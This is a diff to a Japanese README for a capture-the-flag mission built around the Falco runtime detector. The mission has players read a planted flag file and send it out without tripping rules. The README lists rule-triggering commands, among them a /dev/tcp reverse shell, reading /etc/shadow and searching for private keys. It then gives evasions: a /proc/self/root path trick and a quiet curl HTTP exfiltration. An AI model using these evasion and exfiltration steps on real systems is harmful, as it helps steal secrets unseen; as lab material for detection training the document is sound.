@@ -25,7 +25,7 @@ trigger 系ミッションの知識を「やってはいけないこと」とし
 
 | 必須アクション | 素朴なやり方(発火) | 回避(学んだ知識) |
 |---|---|---|
-| flag を読む | `cat /etc/shadow` → Read-sensitive | `/proc/self/root`(**03**) |
+| flag を読む | `cat /opt/nimbus/vault/master.key` → Read-sensitive | `/proc/self/root`(**03**) |
 | 箱の外へ送る | `bash -i >& /dev/tcp/...` → C2(**08**) | curl で HTTP POST |
 | 送信ツール用意 | 自前 exfil バイナリを drop+実行 → Drop+exec(**07**) | 既存の curl を使う |
 | 鍵を漁る/退避 | `find -name id_rsa`/`grep 'PRIVATE KEY'`/`ln` → Search(**04/05**)/Hardlink(**09**) | やらない |
@@ -35,15 +35,16 @@ collector は **HTTP のみ受信**するので、reverse shell では物理的�
 
 ## Flag
 
-postStart (`plant.sh`) が `/etc/shadow` 末尾に `# CTF_MASTER_KEY: FALCO{...}`
-を追記。実値はイベント毎に注入される。ローカルは dev default
+plant (initContainer) が `/opt/nimbus/vault/master.key` に flag だけを
+書き込む(コメントや前後の内容は無し — `cat` すれば flag そのものが出る)。
+実値はイベント毎に注入される。ローカルは dev default
 `FALCO{dev-final-exfil}`。
 
 ## 想定解
 
 ```bash
-# 1) 発火させずに読む (Mission 03)
-FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
+# 1) 発火させずに読む (Mission 03 の技法をこの vault ファイルに再利用)
+FLAG=$(cat /proc/self/root/opt/nimbus/vault/master.key)
 
 # 2) 既存 curl で collector へ静かに HTTP exfil
 curl -s "${FALCO_CTF_COLLECTOR}/api/challenges/10-final-exfil/exfil" \
